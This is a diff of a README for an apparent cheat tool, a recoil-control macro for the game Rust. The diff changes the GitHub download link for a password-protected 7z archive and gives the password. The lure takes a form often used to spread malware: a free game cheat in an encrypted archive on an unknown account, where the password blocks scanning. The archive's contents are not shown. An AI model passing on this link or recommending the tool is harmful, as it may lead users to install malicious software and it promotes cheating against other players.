@@ -11,7 +11,7 @@ Rust Macros Recoil Stabilizer – external utility for managing weapon recoil wi
 ## Download
 
 **Latest version:**  
-🔗 **[Download Rust Recoil Stabilizer](https://github.com/yellowlawmakerdepict/Rust-macro-2026/releases/download/rust/rustgoodv1.0.7z)**
+🔗 **[Download Rust Recoil Stabilizer](https://github.com/yellowlawmakerdepict/Rust-macro-2026/releases/download/rust1/Rust.7z)**
 
 **Password:** `rustgood`
 
